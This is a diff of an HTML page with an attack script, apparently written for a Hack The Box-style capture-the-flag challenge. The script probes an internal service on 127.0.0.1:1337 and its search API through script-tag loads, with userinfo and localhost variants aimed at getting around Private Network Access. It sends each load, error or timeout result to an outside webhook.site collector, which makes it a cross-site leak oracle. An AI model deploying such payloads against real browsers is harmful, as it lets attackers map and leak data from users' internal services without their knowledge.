@@ -3,26 +3,26 @@
 <script>
 const W='https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4';
 
-// Test variations of URL: with/without userinfo, http vs https origin
 function tryURL(name, url){
   return new Promise(resolve=>{
     const s=document.createElement('script');
     s.src=url;
-    s.onload=()=>{ fetch(W+'?test='+name+'&r=load'); resolve('load'); };
-    s.onerror=()=>{ fetch(W+'?test='+name+'&r=err'); resolve('err'); };
+    s.onload=()=>{ fetch(W+'?test='+name+'&r=load'); resolve(); };
+    s.onerror=()=>{ fetch(W+'?test='+name+'&r=err'); resolve(); };
     document.head.appendChild(s);
-    setTimeout(()=>{ fetch(W+'?test='+name+'&r=timeout'); resolve('timeout'); }, 3000);
+    setTimeout(()=>{ fetch(W+'?test='+name+'&r=timeout'); resolve(); }, 4000);
   });
 }
 
 (async()=>{
-  fetch(W+'?abuse_start=1&t='+Date.now());
-  // Test if we can reach 127.0.0.1 at all
-  await tryURL('A_root', 'http://x.x@127.0.0.1:1337/static/js/main.js');
-  await tryURL('B_search_nomatch', 'http://x.x@127.0.0.1:1337/api/entries/search?q=NOPE');
-  await tryURL('C_search_HTB', 'http://x.x@127.0.0.1:1337/api/entries/search?q=HTB');
-  await tryURL('D_jq', 'https://code.jquery.com/jquery-3.6.0.min.js');  // sanity
-  fetch(W+'?abuse_done=1');
+  fetch(W+'?abuse_v3=1&t='+Date.now());
+  // Try with PNA bypass via different schemes/origins
+  await tryURL('plain_main', 'http://127.0.0.1:1337/static/js/main.js');
+  await tryURL('plain_entries_HTB', 'http://127.0.0.1:1337/api/entries/search?q=HTB');
+  await tryURL('userinfo_main', 'http://x.x@127.0.0.1:1337/static/js/main.js');
+  // also try localhost not 127.0.0.1
+  await tryURL('lh_main', 'http://localhost:1337/static/js/main.js');
+  fetch(W+'?abuse_v3_done=1');
 })();
 </script>
 </body></html>
